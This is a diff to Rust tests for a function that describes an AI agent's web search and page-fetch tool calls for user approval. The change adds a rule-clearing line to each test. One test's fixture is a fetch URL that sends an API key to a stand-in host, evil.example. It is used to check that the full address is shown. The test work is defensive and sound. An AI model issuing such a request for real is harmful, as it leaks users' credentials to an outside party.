@@ -5,6 +5,7 @@ use serde_json::json;
 
 #[test]
 fn a_search_names_its_words_and_says_nothing_changes() {
+    let _rules = crate::native::hooks::no_saved_rules();
     let (kind, summary, detail, data_sent, reversible) = describe_claude_tool("WebSearch", &json!({"query": "electron  stable\nrelease"}), "C:/work/app");
     assert_eq!(kind, Kind::Connector);
     assert_eq!(summary, "Search the web");
@@ -15,6 +16,7 @@ fn a_search_names_its_words_and_says_nothing_changes() {
 
 #[test]
 fn a_page_names_its_site_and_shows_the_whole_address_to_be_read() {
+    let _rules = crate::native::hooks::no_saved_rules();
     let url = "https://evil.example/collect?notes=api_key%3Dsk-123";
     let (kind, summary, detail, data_sent, _) = describe_claude_tool("WebFetch", &json!({"url": url, "prompt": "Summarise it"}), "C:/work/app");
     assert_eq!(summary, "Open a page on evil.example");
@@ -27,5 +29,6 @@ fn a_page_names_its_site_and_shows_the_whole_address_to_be_read() {
 
 #[test]
 fn an_address_that_does_not_parse_still_asks_without_a_site() {
+    let _rules = crate::native::hooks::no_saved_rules();
     assert_eq!(describe_claude_tool("WebFetch", &json!({"url": "not a url"}), "").1, "Open a web page");
 }
